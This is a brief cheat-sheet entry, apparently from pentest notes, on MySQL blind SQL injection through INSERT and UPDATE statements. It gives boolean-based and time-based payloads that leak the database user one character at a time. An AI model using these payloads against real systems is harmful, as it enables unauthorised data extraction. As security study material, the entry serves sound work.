## Mysql

#### MySQL Blind Injection in Insert and Update Statements
Source:
https://osandamalith.com/2017/03/13/mysql-blind-injection-in-insert-and-update-statements/

##### Boolean Based Blind Injection:

If the result is true the entry will be updated with a ‘1’ and if the result is false the entry will be updated with a ‘0’.


```
update users set username = ‘0’ | (substr(user(),1,1) regexp 0x5e5b6d2d7a5d) where id=14;

insert into users values (15,’osanda’,'0'| (substr(user(),1,1) regexp 0x5e5b6d2d7a5d));
```

##### Time Based Blind Injection

```
update users set username = '0'|if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) where id=15;

insert into users values (16,’osanda’,'0'| if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1));
```
